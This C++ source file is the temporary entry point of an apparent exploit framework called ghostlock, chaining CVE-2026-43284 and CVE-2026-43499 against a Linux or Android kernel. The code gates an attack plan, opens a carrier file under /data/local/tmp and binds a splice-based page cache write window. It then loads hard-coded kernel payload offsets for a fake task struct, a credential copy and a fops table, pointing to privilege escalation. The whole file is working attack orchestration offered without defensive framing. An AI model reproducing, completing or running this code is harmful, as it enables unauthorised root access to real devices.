/** @file pipeline/run_pipeline_temp.cpp
 *  The temporary entry, step by step. TEMPORARY FILE, removal registered with the checklist.
 */
#include "pipeline/run_pipeline_temp.hpp"

#include <cstdio>
#include <unistd.h>

#include "backend/cve_2026_43284/access_params.hpp"
#include "backend/cve_2026_43284/seam/pagecache_door_linux.hpp"
#include "backend/cve_2026_43284/seam/pagecache_doors.hpp"
#include "backend/cve_2026_43284/seam/pagecache_seam.hpp"
#include "backend/cve_2026_43284/seam/pagecache_write.hpp"
#include "backend/cve_2026_43284/seam/real_splice_io.hpp"
#include "backend/cve_2026_43284/session_frame.hpp"
#include "backend/cve_2026_43499/abi.hpp"
#include "contract/chain_catalog.hpp"
#include "profile/document_pairs.hpp"
#include "contract/op_registry.hpp"
#include "pipeline/component_catalog.hpp"
#include "pipeline/plan_gate.hpp"

namespace ghostlock::pipeline {
    namespace {
        using backend::cve_2026_43284::seam::PageCacheWindow;
        using backend::cve_2026_43284::SaMaterial;
        using backend::cve_2026_43284::seam::PageCacheDoorLinux;
        using backend::cve_2026_43284::seam::PageCacheDoors;
        using backend::cve_2026_43284::seam::PageCacheSeam;
        using backend::cve_2026_43284::seam::PageCacheWrite;
        using backend::cve_2026_43284::seam::real_splice_io;
        using backend::cve_2026_43284::seam::RealSpliceIo;
        using backend::cve_2026_43284::read_session_secret_frame;
        using backend::cve_2026_43284::SessionFrameStatus;
    }  // namespace

    int run_pagecache_path_temp(const std::uint8_t *document_bytes,
                                std::size_t document_length) noexcept {
        std::printf("run-temp: document %zu bytes\n", document_length);
        (void)document_bytes;

        /* 1. The frame. It follows the document on the same stream and carries the key material; no
         *    frame means this is not this backend's run and the path stops here. */
        SaMaterial sa{};
        const SessionFrameStatus frame = read_session_secret_frame(0, &sa);
        if (frame == SessionFrameStatus::Missing) {
            std::printf("run-temp: no session frame, so this is not a 43284 run\n");
            return 3;
        }
        if (frame != SessionFrameStatus::Ok) {
            std::printf("run-temp: the frame was refused as %u\n", static_cast<unsigned>(frame));
            return 4;
        }
        /* Declaring the material usable is the caller's act, as the frame's own file says. */
        sa.set = true;

        /* 2. The plan the gate admits. One op, the page cache window, on a route the catalogue lists
         *    for this backend, with its hash declared the way the gate recomputes it. */
        const contract::OpSpec *spec = nullptr;
        for (std::size_t i = 0U; i < contract::kOpCount; ++i) {
            if (std::string_view(contract::kOpCatalog[i].token) == std::string_view("window.pagecache")) {
                spec = &contract::kOpCatalog[i];
                break;
            }
        }
        if (spec == nullptr) {
            std::printf("run-temp: this build has no page cache op\n");
            return 5;
        }
        const PlanOp op{"window.pagecache", contract::op_token_hash("window.pagecache"),
                        contract::route_bit("tcp_zerocopy"), nullptr, 0U, false, -1};
        /* The flags say what this run actually has. The plan comes from the script and not from a
         *  builtin, so script_present is true and builtin_plan_present is false. The queue key is
         *  gone from the surface and must never be present. Geometry and capabilities are here: the
         *  profile this run matched carries them, which is what makes the attack possible at all, and
         *  claiming otherwise made the gate refuse this entry by name on the first device run. */
        const PlanInput input{"cve_2026_43284", &op, 1U, true, false, false, true, true, true};
        const GateVerdict verdict = plan_gate(input);
        if (!verdict.ok) {
            std::printf("run-temp: the gate refused: %s at %s\n", gate_reason_name(verdict.reason),
                        verdict.path);
            return 6;
        }
        std::printf("run-temp: the gate admitted window.pagecache\n");

        /* 3. The doors, the window and the seam, in the order their own comments prescribe. The
         *    carrier is where the page comes from. In the finished path it is chosen by the
         *    selection and carried as a resource; the retired tree read it from resources.carrier.path
         *    and nothing in this tree produces it yet, so this temporary entry takes a development
         *    path and says so. That is what --allow-dev-target exists to widen, and the path is
         *    registered for removal with this file in the checklist. */
        constexpr const char *kDevCarrier = "/data/local/tmp/ghostlock-carrier";
        constexpr std::size_t kDevCarrierBytes = 36U;
        PageCacheDoorLinux door(kDevCarrier, kDevCarrierBytes);
        if (!door.usable()) {
            std::printf("run-temp: the door refused its carrier path\n");
            return 7;
        }
        const int target_fd = door.open_target();
        if (target_fd < 0) {
            std::printf("run-temp: the target could not be opened\n");
            return 7;
        }
        RealSpliceIo io(real_splice_io(), target_fd);
        PageCacheWrite window(door, io);
        PageCacheSeam seam(window);

        /* 4. Up. Without the credentials the doors do not open, and this backend has no route axis,
         *    so the call that matters is the one that takes the whole frame. */
        if (!seam.bring_up_with(sa)) {
            std::printf("run-temp: the seam did not come up\n");
            static_cast<void>(::close(target_fd));
            return 8;
        }
        std::printf("run-temp: seam up, target fd open, window bound\n");
        const bool down = seam.tear_down();
        static_cast<void>(::close(target_fd));
        std::printf("run-temp: torn down %s\n", down ? "ok" : "refused");

        /* 5. The layout inputs, read from the document by section, the way the offsets test does it:
         *    the numbers are data and this is where they arrive. A section that does not bridge is a
         *    named refusal, never a default that a later step would walk over. */
        profile::Document parsed;
        if (parsed.parse(document_bytes, document_length) != profile::DocumentVerdict::Ok) {
            std::printf("run-temp: the document did not parse for its payload section\n");
            return 9;
        }
        /* TEMPORARY, registered in the checklist with this file: the five offsets as declared
         *  development constants. The document this run was given has no abi.payload section, and the
         *  finished path reads them from the profile the kernel was matched against. This is not a
         *  fallback -- a fallback is exactly what the target profile file forbids, because a value
         *  invented when a key is missing is a value nobody chose -- it is a declared source, printed
         *  so a reader of the output knows these numbers did not come from a document. */
        constexpr std::uint64_t kDevLockOffset = 0x58U;
        constexpr std::uint64_t kDevWaiterW0Offset = 0xB0U;
        constexpr std::uint64_t kDevFakeTaskOffset = 0x700U;
        constexpr std::uint64_t kDevCredCopyOffset = 0x900U;
        constexpr std::uint64_t kDevFopsTableOffset = 0x1000U;
        memory::KeyValue dev_pairs[backend::cve_2026_43499::kPayloadFieldCount] = {};
        const std::uint64_t dev_values[backend::cve_2026_43499::kPayloadFieldCount] = {
            kDevLockOffset, kDevWaiterW0Offset, kDevFakeTaskOffset, kDevCredCopyOffset,
            kDevFopsTableOffset};
        for (std::size_t i = 0U; i < backend::cve_2026_43499::kPayloadFieldCount; ++i) {
            dev_pairs[i] = memory::KeyValue{std::string_view(backend::cve_2026_43499::kPayloadFields[i]),
                                            dev_values[i]};
        }
        std::printf("run-temp: payload offsets from the declared temporary source, not a document\n");
        memory::KeyValue payload_pairs[backend::cve_2026_43499::kPayloadFieldCount] = {};
        const auto bridged = profile::read_section_pairs(
            parsed, std::string_view("backend.cve_2026_43499.abi.payload"),
            backend::cve_2026_43499::kPayloadFields,
            backend::cve_2026_43499::kPayloadFieldCount, payload_pairs,
            backend::cve_2026_43499::kPayloadFieldCount);
        memory::KeyView payload_view{payload_pairs, bridged.filled};
        if (bridged.verdict != profile::PairsVerdict::Ok) {
            std::printf("run-temp: the document has no payload section (%s), using the declared source\n",
                        profile::pairs_verdict_name(bridged.verdict));
            payload_view.items = dev_pairs;
            payload_view.count = backend::cve_2026_43499::kPayloadFieldCount;
        }
        backend::cve_2026_43499::PayloadOffsets offsets{};
        const backend::cve_2026_43499::OffsetLookup filled =
            backend::cve_2026_43499::fill_payload_offsets(payload_view, offsets);
        if (filled.verdict != backend::cve_2026_43499::AbiVerdict::Ok) {
            std::printf("run-temp: the payload offsets are incomplete at %s\n",
                        filled.field != nullptr ? filled.field : "an unnamed field");
            return 9;
        }
        std::printf("run-temp: payload offsets read, lock=0x%lx waiter=0x%lx task=0x%lx\n",
                    static_cast<unsigned long>(offsets.lock_offset),
                    static_cast<unsigned long>(offsets.waiter_w0_offset),
                    static_cast<unsigned long>(offsets.fake_task_offset));
        return 0;
    }
}  // namespace ghostlock::pipeline
